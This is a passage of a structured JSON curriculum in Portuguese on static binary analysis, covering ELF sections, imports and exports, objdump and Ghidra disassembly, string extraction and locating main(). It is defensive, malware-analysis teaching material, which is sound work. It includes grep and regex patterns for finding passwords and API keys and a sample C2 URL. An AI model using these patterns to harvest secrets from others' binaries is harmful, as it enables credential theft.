                                    "Identifique padrões: bibliotecas dinâmicas via .dynamic, símbolos com 'readelf -s'.",
                                    "Crie um relatório resumindo layout, tamanhos e propósitos.",
                                    "Teste modificações: altere .data com hex editor e reexamine.",
                                    "Discuta implicações para segurança (ex: NX bit em .text)."
                                  ],
                                  "verification": "Escreva um relatório de 1 página explicando a organização de um binário analisado.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Binário sample, editor de texto, hex editor opcional (xxd ou bless).",
                                  "tips": "Use gdb 'info proc mappings' para ver runtime mapping após análise estática.",
                                  "learningObjective": "Sintetizar análises para entender a organização completa do binário ELF.",
                                  "commonMistakes": "Ignorar relocações (.rel.* seções); assumir todas seções são padrão."
                                }
                              ],
                              "practicalExample": "Baixe ou compile um programa C simples 'hello world' com gcc -static -o hello. Use readelf -S hello para listar seções, identifique .text (~1KB, r-x), .data (~100B, rw-), .bss (~0B). Com objdump -d .text hello, veja o assembly do main(). Isso revela como código e dados são separados fisicamente.",
                              "finalVerifications": [
                                "Liste corretamente .text, .data e .bss com tamanhos e permissões de um binário dado.",
                                "Explique diferenças entre ELF Header, Section Headers e Program Headers.",
                                "Interprete dump de objdump para uma função simples em .text.",
                                "Identifique se um binário é ELF e sua arquitetura (32/64-bit).",
                                "Compare layouts de dois binários diferentes (estático vs dinâmico).",
                                "Verifique ausência de seções suspeitas em análise de malware básica."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação e descrição de seções principais (90% correto).",
                                "Uso correto de comandos readelf/objdump com flags apropriadas.",
                                "Interpretação coerente das saídas, ligando a conceitos de memória.",
                                "Relatório claro com diagramas e exemplos práticos.",
                                "Demonstração de troubleshooting para erros comuns (ex: binário inválido).",
                                "Conexão com segurança: explicar ASLR/DEP via seções."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: entender linkagem e seções geradas pelo compilador.",
                                "Sistemas Operacionais: mapeamento de seções para processos e memória virtual.",
                                "Engenharia Reversa: base para disassemblers como IDA Pro ou Ghidra.",
                                "Segurança de Software: análise de ROP via .text permissões."
                              ],
                              "realWorldApplication": "Em cibersegurança, analistas usam essas ferramentas para reverse engineering de malware ELF (Linux/Android), verificando injeções em .text ou shells em .data, ou auditando binários para conformidade com proteções como RELRO/PIE."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.1.3",
                            "name": "Inspecionar imports e exports",
                            "description": "Listar funções importadas e exportadas com objdump ou Dependency Walker para mapear dependências externas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o ambiente e ferramentas",
                                  "subSteps": [
                                    "Instale objdump (parte do binutils no Linux: sudo apt install binutils)",
                                    "Baixe e instale Dependency Walker (depends.exe) para Windows de dependwalker.com",
                                    "Obtenha um binário de exemplo (ex: /bin/ls no Linux ou notepad.exe no Windows)",
                                    "Crie um diretório de trabalho isolado para análise",
                                    "Verifique a arquitetura do binário com file comando (ex: file binary.exe)"
                                  ],
                                  "verification": "Confirme instalação executando 'objdump -V' e Dependency Walker abrindo sem erros; binário listado corretamente com 'file'.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Sistema Linux/Windows, binário de teste (ex: ls, notepad.exe), internet para downloads",
                                  "tips": "Use VM isolada para binários suspeitos para evitar execução acidental.",
                                  "learningObjective": "Configurar ferramentas essenciais para análise estática de binários.",
                                  "commonMistakes": "Esquecer de instalar binutils ou usar Dependency Walker em binários não-PE."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Inspecionar exports com objdump",
                                  "subSteps": [
                                    "Execute 'objdump -T binary' para ELF ou 'objdump -p binary.exe | findstr Exported' para PE",
                                    "Identifique funções exportadas (ex: lista de símbolos como main, dll exports)",
                                    "Salve a saída em um arquivo texto para referência",
                                    "Anote o número total de exports e nomes principais",
                                    "Compare com documentação da ferramenta/binário esperado"
                                  ],
                                  "verification": "Lista de exports gerada e salva; pelo menos 1-5 funções listadas corretamente.",
                                  "estimatedTime": "10 minutos",
                                  "materials": "Binário ELF/PE, terminal com objdump",
                                  "tips": "Use 'objdump -T --dynamic-syms' para mais detalhes em símbolos dinâmicos.",
                                  "learningObjective": "Listar e interpretar funções exportadas de um executável.",
                                  "commonMistakes": "Confundir exports com imports; ignorar símbolos fracos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Inspecionar imports com objdump e Dependency Walker",
                                  "subSteps": [
                                    "Execute 'objdump -x binary | grep Imported' ou 'objdump -p binary.exe' para imports",
                                    "Abra o binário no Dependency Walker e navegue para seções Imports/Exports",
                                    "Liste DLLs/bibliotecas importadas e funções específicas (ex: kernel32.dll LoadLibrary)",
                                    "Exporte relatórios do Dependency Walker se disponível",
                                    "Registre dependências externas como APIs suspeitas"
                                  ],
                                  "verification": "Lista completa de imports/DLLs extraída; visualização no Dependency Walker sem crashes.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Binário, objdump, Dependency Walker",
                                  "tips": "Filtre por DLLs de sistema vs. customizadas para priorizar análise.",
                                  "learningObjective": "Identificar e catalogar dependências externas importadas.",
                                  "commonMistakes": "Executar binário acidentalmente no Dependency Walker; ignorar imports atrasados (delay-load)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Mapear e analisar dependências",
                                  "subSteps": [
                                    "Crie um diagrama simples (texto ou draw.io) conectando imports/exports a funcionalidades",
                                    "Identifique dependências críticas (ex: network APIs indicam C2)",
                                    "Pesquise funções suspeitas online (ex: MITRE ATT&CK para APIs usadas em malware)",
                                    "Compare imports/exports com binários benignos similares",
                                    "Documente potenciais vulnerabilidades (ex: uso de APIs deprecated)"
                                  ],
                                  "verification": "Diagrama ou tabela de mapeamento criado; pelo menos 3 dependências analisadas.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "Editor de texto/draw.io, listas de imports/exports salvas",
                                  "tips": "Use scripts Python para parsear objdump output automatizando listagem.",
                                  "learningObjective": "Mapear dependências para entender fluxo de execução e riscos.",
                                  "commonMistakes": "Sobrecarregar análise sem priorizar funções de alto risco."
                                }
                              ],
                              "practicalExample": "Analise notepad.exe (Windows): objdump -p notepad.exe revela imports de user32.dll (MessageBoxA); Dependency Walker mostra árvore de DLLs como kernel32.dll -> advapi32.dll. Mapeie para entender dependências de GUI sem execução.",
                              "finalVerifications": [
                                "Lista completa de exports e imports gerada para pelo menos 2 binários",
                                "Diagrama de dependências criado e salvo",
                                "Funções suspeitas identificadas e pesquisadas",
                                "Relatório textual com achados principais",
                                "Ferramentas testadas em binário conhecido benigno",
                                "Nenhuma execução acidental do binário"
                              ],
                              "assessmentCriteria": [
                                "Precisão na listagem de imports/exports (100% match com ferramentas padrão)",
                                "Profundidade da análise de dependências (identificação de chains DLL)",
                                "Uso correto de ambas ferramentas (objdump + Dependency Walker)",
                                "Qualidade do mapeamento/diagrama (claro e legível)",
                                "Identificação de pelo menos 2 insights de segurança",
                                "Documentação completa sem erros factuais"
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entender linking dinâmico em C/C++",
                                "Sistemas Operacionais: Mecanismos de carregamento de DLLs/ELF",
                                "Redes: Detecção de imports de sockets para C2",
                                "Análise de Malware: Técnicas de RE em ferramentas como IDA Pro"
                              ],
                              "realWorldApplication": "Em análise de malware, mapear imports como WinINet.dll indica comunicações HTTP para C2 servers, permitindo bloqueio proativo; usado por analistas SOC para triagem de binários suspeitos sem execução."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.2",
                        "name": "Disassemblagem Estática",
                        "description": "Técnicas para converter código de máquina em assembly legível, permitindo inspeção do fluxo de execução.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.2.1",
                            "name": "Disassemblar com objdump",
                            "description": "Gerar listagens de assembly de binários usando objdump -d e interpretar instruções básicas como MOV, CALL e JMP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar objdump",
                                  "subSteps": [
                                    "Instale o pacote binutils em um sistema Linux (ex: sudo apt install binutils no Ubuntu/Debian).",
                                    "Verifique a instalação executando 'objdump --version' no terminal.",
                                    "Crie um diretório de trabalho dedicado: mkdir ~/binary_analysis && cd ~/binary_analysis.",
                                    "Baixe um binário de exemplo simples, como um 'hello world' compilado em C.",
                                    "Execute 'file nome_do_binario' para confirmar que é um executável ELF."
                                  ],
                                  "verification": "Comando 'objdump --version' retorna versão válida e 'file' confirma formato ELF.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Sistema Linux ou WSL",
                                    "Acesso root/sudo",
                                    "Compilador gcc para exemplos"
                                  ],
                                  "tips": "Use WSL no Windows para compatibilidade; prefira binários estáticos para simplicidade inicial.",
                                  "learningObjective": "Configurar ambiente de disassemblagem estática com objdump.",
                                  "commonMistakes": [
                                    "Instalar pacote errado (ex: binutils-multiarch em vez de binutils)",
                                    "Executar sem permissões de escrita no diretório",
                                    "Confundir com gdb-objdump"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Preparar e Examinar Binário de Exemplo",
                                  "subSteps": [
                                    "Compile um programa C simples: echo 'int main(){return 0;}' > trivial.c && gcc -o trivial trivial.c -static.",
                                    "Execute 'file trivial' e 'ls -la trivial' para metadados básicos.",
                                    "Use 'readelf -h trivial' para headers ELF (opcional, mas introdutório).",
                                    "Liste seções com 'objdump -h trivial' para entender estrutura.",
                                    "Identifique seção .text como foco principal para código."
                                  ],
                                  "verification": "Visualize headers e seções corretamente sem erros de formato.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "GCC instalado",
                                    "Editor de texto",
                                    "Binário trivial compilado"
                                  ],
                                  "tips": "Sempre use -static para evitar dependências dinâmicas confusas.",
                                  "learningObjective": "Preparar binários estáticos e mapear estrutura ELF básica.",
                                  "commonMistakes": [
                                    "Compilar dinamicamente (causa chamadas externas)",
                                    "Ignorar flags de arquitetura (ex: -m64)",
                                    "Não verificar se é executável"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar Listagem de Assembly com objdump -d",
                                  "subSteps": [
                                    "Execute 'objdump -d trivial > trivial.asm' para disassemblar.",
                                    "Abra trivial.asm em um editor e localize seção <main>:.",
                                    "Identifique endereços hexadecimais e opcodes.",
                                    "Navegue pelo output: note disassembly linha por linha.",
                                    "Compare com 'objdump -d -M intel trivial' para sintaxe Intel (opcional)."
                                  ],
                                  "verification": "Arquivo .asm gerado contém instruções assembly legíveis sem erros de parsing.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Binário preparado",
                                    "Editor de texto (vim/nano)",
                                    "Terminal"
                                  ],
                                  "tips": "Redirecione para arquivo para análise offline; use | less para visualização rápida.",
                                  "learningObjective": "Produzir e navegar em listagens de disassembly de binários.",
                                  "commonMistakes": [
                                    "Usar -D em vez de -d (disassembla dados também)",
                                    "Binário corrompido causa falha",
                                    "Ignorar arquitetura (ex: objdump -d -b binary)"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Interpretar Instruções Básicas: MOV, CALL e JMP",
                                  "subSteps": [
                                    "Localize instruções MOV: entenda como mov src, dst move dados (registre para memória).",
                                    "Identifique CALL: nota chamadas de função (ex: call 0x401000) e pilha.",
                                    "Analise JMP: diferencia jmp direto/indireto e condicionais (je, jne).",
                                    "Trace fluxo: anote entrada main, MOVs de setup, CALLs e JMPs de controle.",
                                    "Anotar em papel: desenhe grafo simples de fluxo de execução."
                                  ],
                                  "verification": "Explique verbalmente ou por escrito o propósito de 3+ MOV, 1 CALL e 1 JMP no código.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Listagem .asm",
                                    "Papel/caneta para diagrama",
                                    "Documentação x86 (online)"
                                  ],
                                  "tips": "Comece com binários triviais; use intel-syntax para legibilidade.",
                                  "learningObjective": "Reconhecer e interpretar MOV (dados), CALL (funções) e JMP (controle).",
                                  "commonMistakes": [
                                    "Confundir MOV com ADD",
                                    "Ignorar registradores (eax vs rax)",
                                    "Não considerar contexto de 32/64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar e Validar Análise Completa",
                                  "subSteps": [
                                    "Disassembie um binário mais complexo (ex: hello world com printf).",
                                    "Identifique CALL para printf e JMPs de loop se houver.",
                                    "Compare disassembly com código fonte original.",
                                    "Execute binário e use 'strace' para correlacionar chamadas.",
                                    "Documente achados em relatório curto."
                                  ],
                                  "verification": "Relatório lista 5+ instruções interpretadas corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Binário hello world",
                                    "strace instalado"
                                  ],
                                  "tips": "Correlacione com gdb para validação dinâmica.",
                                  "learningObjective": "Aplicar disassembly em cenários reais e validar interpretações.",
                                  "commonMistakes": [
                                    "Sobrepor análise sem fonte",
                                    "Ignorar prologo/epílogo de função",
                                    "Não notar otimizações do compilador"
                                  ]
                                }
                              ],
                              "practicalExample": "Compile 'hello.c' com printf('Hello World\\n'); usando gcc -static -o hello hello.c. Execute objdump -d hello, localize main: note MOV para setup de string, CALL 0x... para printf, JMP para retorno. Trace mostra fluxo: push string -> call printf -> mov eax,0 -> ret.",
                              "finalVerifications": [
                                "Gera disassembly limpa de binário ELF com objdump -d.",
                                "Identifica e descreve pelo menos 3 MOVs (fonte/destino).",
                                "Explica CALL como transição de função com pilha.",
                                "Diferencia JMP direto de condicional em fluxo.",
                                "Valida análise comparando com execução real.",
                                "Cria diagrama de fluxo básico do main."
                              ],
                              "assessmentCriteria": [
                                "Precisão na geração de listagem (sem erros de sintaxe).",
                                "Correta interpretação de 80% das instruções básicas listadas.",
                                "Uso correto de flags objdump (ex: -d vs -D).",
                                "Demonstração de fluxo de controle via JMP/CALL.",
                                "Relatório claro com exemplos anotados.",
                                "Tempo de análise eficiente (<2h para binário simples)."
                              ],
                              "crossCurricularConnections": [
                                "Programação em Assembly/C: entendimento de geração de código.",
                                "Arquitetura de Computadores: registradores, memória e pipeline.",
                                "Engenharia Reversa: base para ferramentas como IDA Pro/Ghidra.",
                                "Análise de Malware: detecção de payloads via disassembly.",
                                "Sistemas Operacionais: ELF format e loaders."
                              ],
                              "realWorldApplication": "Em cibersegurança, disassemblar binários suspeitos com objdump para analisar malware, identificar exploits em binários vulneráveis (ex: ROP chains via JMPs), ou debugar software proprietário sem símbolos, essencial em resposta a incidentes e pentesting."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.2",
                            "name": "Usar Ghidra para análise interativa",
                            "description": "Importar binários no Ghidra, navegar pelo grafo de controle de fluxo e renomear funções para facilitar a análise.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Criar Projeto e Importar Binário no Ghidra",
                                  "subSteps": [
                                    "Baixe e extraia um binário de exemplo (ex: um executável ELF simples de um site de CTF).",
                                    "Abra o Ghidra e crie um novo projeto via File > New Project.",
                                    "Arraste o binário para o projeto ou use File > Import File, selecionando o formato correto (ex: ELF x86-64).",
                                    "Revise as opções de importação (idioma, análise inicial) e confirme.",
                                    "Execute a análise automática via Analyze na janela CodeBrowser."
                                  ],
                                  "verification": "Confirme que o binário aparece no projeto sem erros e a análise gera um Listing view com código desmontado.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Ghidra instalado (versão 10+), binário de exemplo (ex: de crackmes.one), Java JDK 17+",
                                  "tips": "Sempre verifique o endianness e bitness no import para evitar erros de análise.",
                                  "learningObjective": "Dominar a criação de projetos e importação correta de binários para análise inicial.",
                                  "commonMistakes": "Selecionar formato de arquivo errado levando a desmontagem incorreta; ignorar análise automática."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar a Visualização de Listing e Symbol Tree",
                                  "subSteps": [
                                    "Abra o binário no CodeBrowser (double-click no projeto).",
                                    "Navegue pelo Symbol Tree (janela esquerda) para identificar funções como main ou entry.",
                                    "Use o Listing view (centro) para ler o código desmontado e p-code.",
                                    "Aplique atalhos: G para ir para endereço, / para buscar funções/strings.",
                                    "Expanda funções no Decompiler view (direita) para ver pseudo-código C."
                                  ],
                                  "verification": "Localize e identifique pelo menos 3 funções principais no Symbol Tree e Listing.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "Projeto Ghidra aberto com binário analisado",
                                  "tips": "Use o Decompiler para entender lógica high-level antes de mergulhar em assembly.",
                                  "learningObjective": "Habilitar navegação eficiente pelas estruturas principais do binário.",
                                  "commonMistakes": "Não usar Decompiler, focando só em assembly; ignorar Symbol Tree."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Navegar pelo Grafo de Controle de Fluxo (CFG)",
                                  "subSteps": [
                                    "Selecione uma função no Listing e pressione 'G' ou right-click > Graph > Flow Graph.",
                                    "Analise os nós e arestas no CFG: identifique loops, condicionais e caminhos de execução.",
                                    "Use zoom e pan para navegar; right-click em arestas para ver condições.",
                                    "Siga caminhos críticos clicando em nós para pular no Listing.",
                                    "Adicione bookmarks (Ctrl+B) em pontos de interesse no grafo."
                                  ],
                                  "verification": "Desenhe mentalmente ou anote 2 caminhos de execução principais de uma função no CFG.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "CodeBrowser com função selecionada",
                                  "tips": "Aumente o contraste do grafo em Edit > Tool Options > Graph para melhor visibilidade.",
                                  "learningObjective": "Interpretar fluxos de controle visuais para mapear lógica do programa.",
                                  "commonMistakes": "Confundir nós de chamada com retornos; não correlacionar grafo com Listing."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Renomear Funções e Melhorar a Análise",
                                  "subSteps": [
                                    "Selecione uma função no Listing/Symbol Tree, right-click > Rename Function (ex: renomeie 'FUN_00123456' para 'handle_login').",
                                    "Adicione comentários via 'C' no Listing ou Decompiler.",
                                    "Defina tipos locais/variáveis via Edit > Tool Options ou right-click > Set Data Type.",
                                    "Crie labels para jumps/blocos via 'L' e reanalise (right-click > Auto Analyze).",
                                    "Salve o projeto e exporte relatório via File > Export > XML."
                                  ],
                                  "verification": "Verifique que funções renomeadas aparecem corretamente no Symbol Tree e Decompiler atualiza.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "Projeto Ghidra com análise prévia",
                                  "tips": "Use nomes descritivos baseados em comportamento observado para facilitar reutilização.",
                                  "learningObjective": "Personalizar o binário para análise colaborativa e iterações futuras.",
                                  "commonMistakes": "Renomear sem base, causando confusão; esquecer de salvar alterações."
                                }
                              ],
                              "practicalExample": "Analise um binário crackme ELF simples: importe-o, navegue o CFG da função main para encontrar a senha correta ('crackme123'), renomeie funções como check_password e exporte um relatório com caminhos identificados.",
                              "finalVerifications": [
                                "Projeto Ghidra salvo com binário importado e analisado sem erros.",
                                "Grafo de CFG de pelo menos uma função explorado com caminhos anotados.",
                                "Três funções renomeadas com comentários adicionados.",
                                "Decompiler mostra pseudo-código legível com tipos definidos.",
                                "Relatório exportado resumindo achados principais.",
                                "Reproduzibilidade: reabra o projeto e confirme navegação intuitiva."
                              ],
                              "assessmentCriteria": [
                                "Precisão na importação e análise inicial (sem warnings graves).",
                                "Proficiência em navegação CFG: identifica corretamente 80% dos caminhos lógicos.",
                                "Qualidade de renomeações: nomes semânticos e consistentes.",
                                "Uso efetivo de Decompiler e correlações com assembly.",
                                "Tempo total abaixo de 60 minutos para exemplo prático.",
                                "Relatório claro com screenshots de CFG e renomeações."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Entender assembly reforça conceitos de C/linguagens low-level.",
                                "Sistemas Operacionais: Conhecimento de ELF/PE formats e loaders.",
                                "Matemática: Lógica booleana em condicionais do CFG.",
                                "Desenvolvimento de Software: Debugging e refatoração similar a IDEs."
                              ],
                              "realWorldApplication": "Em análise de malware, reverse engineers usam Ghidra para dissecar binários maliciosos, mapear C2 communications via CFG e renomear funções para relatórios de threat intelligence em equipes de SOC."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.3",
                            "name": "Analisar strings e constantes",
                            "description": "Extrair strings com strings command e correlacioná-las com referências no disassembly para identificar dados sensíveis.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Extrair strings do binário usando o comando strings",
                                  "subSteps": [
                                    "Instale ou verifique a disponibilidade do utilitário 'strings' no ambiente de análise (ex: Linux com binutils).",
                                    "Execute o comando 'strings nome_do_binario > strings_output.txt' para extrair sequências imprimíveis de pelo menos 4 caracteres.",
                                    "Filtre strings relevantes usando grep, como 'grep -i \"http\\|pass\\|key\" strings_output.txt > filtered_strings.txt'.",
                                    "Revise o arquivo de saída para identificar potenciais strings sensíveis (URLs, credenciais, chaves API).",
                                    "Documente as strings extraídas em uma tabela com colunas: string, offset aproximado (se suportado), suspeita de sensibilidade."
                                  ],
                                  "verification": "Verifique se o arquivo strings_output.txt contém pelo menos 100 strings imprimíveis e filtered_strings.txt tem strings suspeitas listadas.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Binário alvo (ex: ELF/PE), terminal Linux, utilitário 'strings' e 'grep'",
                                  "tips": "Use a flag '-n 6' no strings para strings mais longas e reduzir ruído.",
                                  "learningObjective": "Dominar a extração automatizada de strings estáticas de binários executáveis.",
                                  "commonMistakes": "Ignorar strings codificadas ou ofuscadas; não filtrar por contexto relevante como 'pass' ou 'api_key'."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar disassembly estático do binário",
                                  "subSteps": [
                                    "Carregue o binário em uma ferramenta de disassembly como Ghidra, IDA Free ou objdump.",
                                    "Use 'objdump -d nome_do_binario > disassembly.txt' para uma visão inicial em assembly x86/ARM.",
                                    "Navegue pela seção .text e .data no disassembler para visualizar código e dados.",
                                    "Identifique funções principais como main() ou entry point usando cross-references.",
                                    "Exporte ou anote offsets de seções relevantes para correlação futura."
                                  ],
                                  "verification": "Confirme que o disassembly.txt cobre todas as seções executáveis e entry point é visível.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Ferramenta de disassembly (Ghidra/IDA/objdump), binário alvo",
                                  "tips": "Em Ghidra, use 'Window > Strings' para integração automática com strings extraídas.",
                                  "learningObjective": "Aprender a gerar e navegar em representações de assembly de binários.",
                                  "commonMistakes": "Focar apenas em .text sem checar .rodata ou .data onde strings residem."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar referências cruzadas às strings no disassembly",
                                  "subSteps": [
                                    "Busque cada string filtrada no disassembly usando busca global (Ctrl+F em Ghidra/IDA).",
                                    "Registre offsets de referências (ex: mov eax, [string_offset]; call printf).",
                                    "Trace cross-references (XREFs) para ver onde a string é carregada ou usada.",
                                    "Classifique usos: impressão (printf), comparação (strcmp), passagem para API (ex: connect()).",
                                    "Anote em uma tabela: string | offset | instruções de referência | função envolvida."
                                  ],
                                  "verification": "Para cada string suspeita, liste pelo menos 1-3 XREFs com instruções exatas.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": "Disassembly gerado, lista de strings filtradas, tabela de anotações (Excel/Notion)",
                                  "tips": "Em IDA/Ghidra, clique direito na string para 'Jump to xrefs' e acelere o processo.",
                                  "learningObjective": "Desenvolver habilidade em rastrear referências de dados no código assembly.",
                                  "commonMistakes": "Confundir referências dinâmicas (heap) com estáticas; ignorar XREFs indiretas."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Correlacionar e analisar para identificar dados sensíveis",
                                  "subSteps": [
                                    "Avalie contexto: strings usadas em funções de rede (connect/send), cripto ou autenticação.",
                                    "Classifique sensibilidade: alta (senhas, chaves), média (URLs C&C), baixa (mensagens UI).",
                                    "Verifique ofuscação: strings XORed ou base64; decode se possível.",
                                    "Gere relatório: impacto potencial (ex: vazamento de credenciais em malware).",
                                    "Valide com execução dinâmica se necessário (em sandbox), mas priorize estático."
                                  ],
                                  "verification": "Relatório final lista strings sensíveis com justificativa contextual e XREFs.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": "Tabela de correlações, relatório template, ferramentas auxiliares (CyberChef para decode)",
                                  "tips": "Priorize strings com padrões regex como 'api_key=[A-Za-z0-9]{32}' para eficiência.",
                                  "learningObjective": "Interpretar contextos de uso para classificar riscos de dados sensíveis.",
                                  "commonMistakes": "Superestimar strings benignas como 'error'; subestimar strings parciais."
                                }
                              ],
                              "practicalExample": "Em um binário de malware (ex: sample.elf), extraia strings como 'http://c2server.com/api' com 'strings'. No disassembly Ghidra, encontre XREF em função connect() no offset 0x401200: mov rsi, 0x402010 (endereço da string). Conclua que é um C&C server sensível, permitindo bloqueio de rede preemptivo.",
                              "finalVerifications": [
                                "Todas strings filtradas têm pelo menos uma XREF documentada.",
                                "Relatório classifica corretamente dados sensíveis com evidências.",
                                "Offsets e instruções batem com disassembly original.",
                                "Análise cobre seções .data/.rodata completamente.",
                                "Nenhum falso positivo em classificações sensíveis.",
                                "Tempo total de análise dentro de 2 horas."
                              ],
                              "assessmentCriteria": [
                                "Precisão na extração e filtragem de strings (90% recall de sensíveis).",
                                "Completude das XREFs (todas referências principais rastreadas).",
                                "Qualidade da análise contextual (justificativas claras e acionáveis).",
                                "Eficiência temporal (dentro dos estimates).",
                                "Relatório estruturado e profissional.",
                                "Identificação correta de ofuscação básica."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C/Assembly: Entender manipulação de strings em memória.",
                                "Forense Digital: Coleta de evidências em investigações de malware.",
                                "Redes e Criptografia: Reconhecer padrões de C&C e chaves.",
                                "Análise de Vulnerabilidades: Ligação com buffer overflows em strings."
                              ],
                              "realWorldApplication": "Em equipes de Threat Hunting ou SOC, essa técnica identifica C&C servers em malware para IOCs, ou vazamentos de API keys em binários corporativos, prevenindo breaches em análises de engenharia reversa."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.4",
                            "name": "Identificar funções principais",
                            "description": "Localizar main(), entry point e funções críticas no disassembly para focar a análise.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de disassemblagem estática",
                                  "subSteps": [
                                    "Instale uma ferramenta de disassembly como IDA Pro Free, Ghidra ou objdump.",
                                    "Carregue o binário alvo no disassembler selecionado.",
                                    "Navegue para a visão de grafo ou listagem de disassembly.",
                                    "Identifique a arquitetura do binário (ex: x86, x64) nas propriedades do arquivo.",
                                    "Ative símbolos ou strings se disponíveis para auxiliar na navegação."
                                  ],
                                  "verification": "Confirme que o binário está carregado corretamente e a disassembly é visível sem erros de parsing.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Binário executável de exemplo (ex: hello world compilado), Ghidra ou IDA Free, documentação da ferramenta",
                                  "tips": "Use binários simples inicialmente para praticar a configuração.",
                                  "learningObjective": "Preparar ferramentas essenciais para análise de disassembly estática.",
                                  "commonMistakes": "Escolher ferramenta incompatível com a arquitetura; ignorar opções de auto-análise."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Localizar o entry point do binário",
                                  "subSteps": [
                                    "Verifique o cabeçalho PE/ELF para o endereço de entry point (use 'file' no Linux ou PEiD no Windows).",
                                    "No disassembler, pule para o endereço de entry point (ex: Ctrl+G no IDA).",
                                    "Analise as primeiras instruções: procure por chamadas iniciais como inicialização de bibliotecas.",
                                    "Trace o fluxo até a primeira chamada de função não-trivial.",
                                    "Anote o endereço e nome simbólico do entry point, se rotulado."
                                  ],
                                  "verification": "Entry point identificado e suas instruções iniciais listadas corretamente.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": "Binário com entry point conhecido, calculadora hexadecimal para endereços",
                                  "tips": "Entry points comuns em x86: endereço após cabeçalho; use strings como '_start' em ELF.",
                                  "learningObjective": "Dominar localização do ponto de entrada para iniciar análise de fluxo.",
                                  "commonMistakes": "Confundir entry point com main(); ignorar relocações dinâmicas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Identificar a função main() ou equivalente",
                                  "subSteps": [
                                    "Do entry point, trace chamadas de funções (calls) até encontrar uma com padrão de argc/argv.",
                                    "Procure por padrões: push/pop de argumentos, calls para printf ou similares.",
                                    "Use busca por strings (ex: 'main') ou cross-referências em símbolos.",
                                    "Valide analisando o prólogo da função: sub esp, mov ebp,esp.",
                                    "Renomeie a função como 'main' no disassembler para facilitar."
                                  ],
                                  "verification": "Função main localizada, com parâmetros corretos e fluxo de entrada confirmado.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": "Binário com main conhecida, referências de assembly (ex: Intel manual)",
                                  "tips": "Em C++, main pode ser mangled; foque em padrões de runtime.",
                                  "learningObjective": "Reconhecer assinaturas de main() em código assembly desmontado.",
                                  "commonMistakes": "Parar no entry point achando ser main; confundir com funções de init."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detectar funções críticas adicionais",
                                  "subSteps": [
                                    "Da main(), liste todas as chamadas (cross-references).",
                                    "Priorize funções com strings sensíveis (ex: 'password', 'connect') ou imports perigosos (ex: system, execve).",
                                    "Analise tamanho e complexidade: funções grandes ou com loops são críticas.",
                                    "Use grafo de chamadas para mapear dependências.",
                                    "Documente 3-5 funções chave com endereços e propósitos inferidos."
                                  ],
                                  "verification": "Lista de funções críticas com justificativas e ligações à main.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": "Grafo de chamadas do disassembler, lista de funções comuns em C (ex: malloc, strcpy)",
                                  "tips": "Funções críticas frequentemente lidam com I/O, memória ou rede.",
                                  "learningObjective": "Mapear funções essenciais para análise direcionada de vulnerabilidades.",
